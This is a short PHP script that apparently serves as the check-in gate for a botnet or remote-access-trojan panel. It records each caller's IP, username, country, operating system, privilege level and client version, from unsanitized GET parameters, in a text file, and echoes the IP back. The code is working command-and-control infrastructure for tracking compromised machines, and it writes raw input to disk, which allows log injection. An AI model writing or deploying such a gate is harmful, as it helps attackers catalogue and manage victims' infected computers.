<?php
 $Username = $_GET["username"];
 $Country = $_GET["country"];
 $IP = $_SERVER['REMOTE_ADDR'];
 $os = $_GET["os"];
 $priv = $_GET["priv"];
 $version = $_GET["version"];
 $File = "main.txt"; 
 $Handle = fopen($File, "a");
 fwrite($Handle, "*");
 fwrite($Handle, $IP);
 fwrite($Handle, "|");
 fwrite($Handle, $Username);
 fwrite($Handle, "|");
 fwrite($Handle, $Country);
 fwrite($Handle, "|");
 fwrite($Handle, $os);
 fwrite($Handle, "|");
 fwrite($Handle, $priv);
 fwrite($Handle, "|");
 fwrite($Handle, $version);
 print $IP; 
 fclose($Handle);
?>